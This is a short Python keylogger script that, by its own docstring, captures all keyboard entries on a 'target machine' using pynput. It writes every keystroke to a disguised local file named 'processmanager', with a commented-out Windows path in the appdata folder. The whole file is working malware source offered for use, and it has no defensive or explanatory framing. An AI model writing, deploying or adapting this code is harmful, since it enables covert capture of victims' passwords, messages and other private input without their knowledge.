# -*- Coding : utf-8 -*-

"""
    Catch all target machine keyboard entries.
"""

import os, sys
from pynput.keyboard import Listener

keys = []
count = 0

path = "processmanager" # For linux machines
#path = os.environ["appdata"] + "\\processmanager" # For windows machines

def write_file(keys):
    with open(path, "a") as file:
        for key in keys:
            key = str(key).replace("'", "")

            if key.find('backspace') > 0:
                file.write(" BACKSPACE ")
            elif key.find('enter') > 0:
                file.write("\n")
            elif key.find('shift') > 0:
                file.write(" SHIFT ")
            elif key.find('space') > 0:
                file.write(" ")
            elif key.find('caps_lock') > 0:
                file.write(" CAPS_LOCK ")
            elif key.find("Key"):
                file.write(key)

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
try:
    print("[*] Key logging...")
    with Listener(on_press=on_press) as Listener:
        Listener.join()
except KeyboardInterrupt:
    print("[X] Keylogger closed.")
    sys.exit(0)